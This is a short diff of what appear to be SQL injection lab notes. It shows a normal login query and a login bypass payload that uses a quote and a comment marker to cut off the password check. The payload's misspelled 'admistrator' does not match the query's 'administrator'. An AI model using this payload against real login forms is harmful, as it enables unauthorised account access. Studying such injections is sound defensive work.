@@ -1,0 +1,7 @@
+username=wiener&password=bluecheese
+
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+username=admistrator'--&password=randomvalue
+
+SELECT * FROM users WHERE username = 'administrator'--' AND password = 'randomvalue'
